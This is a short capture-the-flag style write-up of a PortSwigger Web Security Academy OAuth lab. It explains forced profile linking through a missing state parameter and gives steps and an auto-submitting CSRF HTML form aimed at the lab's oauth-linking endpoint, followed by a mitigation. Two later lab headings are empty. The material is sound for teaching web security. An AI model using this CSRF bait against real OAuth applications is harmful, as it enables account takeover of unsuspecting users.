
### Target

    https://portswigger.net/web-security/all-labs

### Lab: Forced OAuth profile linking

**Vulnerability**

Vulnerable component: `OAuth client application`

Exploitation technique: CSRF against `OAuth client application`

Impact: `OAuth client application` account takeover

Implementation issue in OAuth client application. The application does not contain proper `nonce` parameter during `authorization request` making OAuth flow vulnerable to CSRF attack. Successful exploitation of the flaw allows to associate attacker's controlled account on the identity provider with a victim's account on OAuth client application resulting in an account takeover.

**Exploitation**

1. An attacker initiates OpenID Connect flow on OAuth client application (blog).
2. Halt the flow (from [1]) just before OAuth service redirects the browser back to OAuth client application `redirect_uri`.
3. Prepare CSRF bait site with the following content (where `CODE` value is taken from the response from [2]:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://aca71f891eeb2a5bc1beada2008700a3.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="CODE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. Trick the victim to vist the prepared site.

**Mitigation**

Implement and properly handle state (`nonce`) during OAuth `authorization request`:

    GET /authz?client_id=ID&response_type=CODE&scope=SCOPE&redirect_uri=REDIRECT_URI&state=NONCE


### Lab: Authentication bypass via OAuth implicit flow


### Lab: OAuth account hijacking via redirect_uri
